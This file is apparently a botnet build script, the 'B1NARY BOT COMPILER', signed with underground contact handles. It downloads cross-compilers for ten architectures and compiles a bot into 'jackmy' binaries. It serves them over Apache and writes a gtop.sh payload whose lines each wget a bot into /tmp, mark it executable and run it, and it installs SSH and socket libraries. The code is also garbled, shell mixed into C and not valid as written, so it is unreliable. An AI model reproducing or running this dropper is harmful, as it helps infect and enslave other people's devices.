/*
[BT.c] VERSION 1.0
~B1NARY~
Skype: bl4ck.j3sus
XMPP: b1nary@darkness.su
Made: 3-17-16
*/

//Includes
#include <stdio.h>
#include <stdlib.h>

//Banner & Usage
fprintf "###############################################################################"
fprintf "# ___     __________  ____ _______      _____ _______________.___.  ___       #"
fprintf "# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  #"
fprintf "# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  #"
fprintf "#           |    |   \ |   /    |    \/    |    \    |   \\____   |           #"
fprintf "#           |______  / |___\____|__  /\____|__  /____|_  // ______|           #"
fprintf "#                  \/              \/         \/       \/ \/                  #"
fprintf "###############################################################################"
fprintf "					Skype:bl4ck.j3sus | XMPP:b1nary@darkness.su					"
fprintf "					 B1NARY BOT COMPILER Version 1.0 | 3-17-16					"
fprintf "							USAGE: ./BT [BOTNAME.C]								"
fprintf
sleep 3
//WgetLinks
#define mips http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
#define mipsel http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
#define sh4 http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
#define x86_64 http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
#define armv6l http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
#define i686 http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
#define powerpc http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
#define i586 http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
#define m86k http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
#define sparc http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2

//Botnames
#define L1 jackmymipsel	//mipsel
#define L2 jackmymips	//mips
#define L3 jackmysh4	//sh4
#define L4 jackmyx86	//x86_64
#define L5 jackmyarmv6	//armv6l
#define L6 jackmyi686	//i686
#define L7 jackmypowerpc	//powerpc
#define L8 jackmyi586	//i586
#define L9 jackmym86k	//m86k
#define L10 jackmysparc	//sparc

int aptgets()
{
	system(apt-get install tar -q)
	system(apt-get instal bzip -y;apt-get install bzip2 -y)
}

int wgetting()
{
	if [ -d cross-compiler-mips]
	then
	fprintf "cross-compiler-mips is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-mips*)
	if [ -d cross-compiler-mipsel]
	then
	fprintf "cross-compiler-mipsel is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-mipsel*)
	if [cross-compiler-sh4]
	then
	fprintf "cross-compiler-sh4 is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-sh4*)
	if [-d cross-compiler-x86_64]
	then
	fprintf "cross-compiler-x86_64 is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-x86_64*)
	if [-d cross-compiler-armv6l]
	then
	fprintf "cross-compiler-armv6l is present, no need for wget"
	else
	system(wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-armv6l*)
	if [-d cross-compiler-powerpc]
	then
	fprintf "cross-compiler-powerpc is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-powerpc)
	if [-d cross-compiler-m68k]
	then
	fprintf "cross-compiler-m68k is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-m68k*)
	if [-d cross-compiler-sparc]
	then
	fprintf "cross-compiler-sparc is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-sparc*)
	if [-d cross-compiler-i586]
	then
	fprintf "cross-compiler-i586 is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-i586)
	if [-d cross-compiler-i686]
	then
	fprintf "cross-compiler-i686 is present, no need for wget"
	else
	system(wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2 --no-check-certificate)
	system(tar -xvjf cross-compiler-i686)
	system(rm -rf *.tar.bz2)
	fprintf "Done."
	sleep 3
}

int compiling ()
{
	system(./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -DMIPSEL -o (L1) $1 > /dev/null 2>&1)
	system(./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o (L2) $1 > /dev/null 2>&1)
	system(./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o (L3) $1 > /dev/null 2>&1)
	system(./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -Dx86_64 -o (L4) $1 > /dev/null 2>&1)
	system(./cross-compiler-armv6l/bin/armv6l-gcc -static -lpthread -pthread -Darmv6l -o (L5) $1 > /dev/null 2>&1)
	system(./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o (L6) $1 > /dev/null 2>&1)
	system(./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dpowerpc -o (L7) $1 > /dev/null 2>&1)
	system(./cross-compiler-i586/bin/i586-gcc -static -lpthread -pthread -Di586 -o (L8) $1 > /dev/null 2>&1)
	system(./cross-compiler-m86k/bin/m86k-gcc -static -lpthread -pthread -Dm86k -o (L9) $1 > /dev/null 2>&1)
	system(./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o (L10) $1 > /dev/null 2>&1)
	fprintf "Done."
	system(apt-get install apache2; apt-get install php5 -y -q;apt-get install nginx;)
	system(yum install httpd; yum install php -y -q)
	system(mv jackmy* /var/www/html)
	fprintf "Restarting Your Apache..."
	system(service httpd restart)
	system(service apache2 restart)
}

int gtop ()
{
	fprintf "Making Payload..."
	system(cd /var/www/html; touch gtop.sh)
	fprintf "This Will Take a Few, Be Patient.."
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L1 && chmod +x $L1 && ./$L1">> /vsr/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L2 && chmod +x $L2 && ./$L2">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L3 && chmod +x $L3 && ./$L3">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L4 && chmod +x $L4 && ./$L4">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L5 && chmod +x $L5 && ./$L5">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L6 && chmod +x $L6 && ./$L6">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L7 && chmod +x $L7 && ./$L7">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L8 && chmod +x $L8 && ./$L8">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L9 && chmod +x $L9 && ./$L9">> /var/www/html/gtop.sh
	fprintf "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L10 && chmod +x $L10 && ./$L10">> /var/www/html/gtop.sh
}

int LRABDependencies ()
{
	sleep 6
	fprintf "Finishing Up Install"
	system(yum install cpan wget curl glibc.i686 -y)
	system(cpan force install Parallel::ForkManager)
	system(cpan force install IO::Socket)
	system(cpan force install IO::Select)
	sleep 2
	system(yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap -y)
	system(pecl install -f ssh2)
	system(touch /etc/php.d/ssh2.ini)
	fprintf extension=ssh2.so > /etc/php.d/ssh2.ini
	system(cpan force install Net::SSH2)
}

int main()